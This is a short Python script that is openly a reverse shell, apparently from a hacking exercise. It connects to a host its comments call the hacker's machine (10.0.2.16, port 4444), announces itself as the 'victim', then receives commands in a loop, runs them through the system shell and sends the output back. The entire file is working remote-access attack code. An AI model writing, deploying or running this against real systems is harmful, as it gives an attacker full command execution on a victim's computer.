import socket
import subprocess

def execute_system_command(command) : 
	return subprocess.check_output(command,shell=True)

#connect() method takes one tuple as argument where the ip and open port on hacker's machine is to be specified . .  .


connection = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
connection.connect(("10.0.2.16" , 4444))

connection.send("\n[+] connection send by victim \n")

while True : 
	received_command = connection.recv(1024)
	result  = execute_system_command(received_command)
	connection.send(result)


connection.close()

